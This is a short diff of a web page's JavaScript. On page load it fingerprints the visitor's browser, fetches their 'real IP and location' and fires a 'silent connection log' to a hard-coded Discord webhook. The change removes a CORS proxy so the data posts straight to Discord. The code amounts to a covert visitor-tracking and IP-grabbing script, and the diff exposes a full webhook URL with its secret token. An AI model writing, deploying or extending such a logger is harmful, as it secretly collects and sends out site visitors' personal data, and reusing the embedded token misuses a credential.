@@ -150,9 +150,9 @@ document.addEventListener('DOMContentLoaded', () => {
         webdriver: navigator.webdriver ? "Yes (Bot/Automation)" : "No",
     };
 
-    // Constants for Discord Webhook bypassing CORS
+    // Constants for Discord Webhook (Discord natively supports CORS, so no proxy needed)
     const webhookUrl = "https://discord.com/api/webhooks/1485369933058674718/5iNQokQ6pdB6BBQo7KSW5oAvgEImWbbok-NR2YvtGw0NEg5jQ5ZmlQEeFaMe1Px9NhFT";
-    const proxiedWebhookUrl = "https://corsproxy.io/?" + encodeURIComponent(webhookUrl);
+    const proxiedWebhookUrl = webhookUrl;
 
     // Fetch real IP and location data, and fire silent connection log
     async function fetchUserData() {
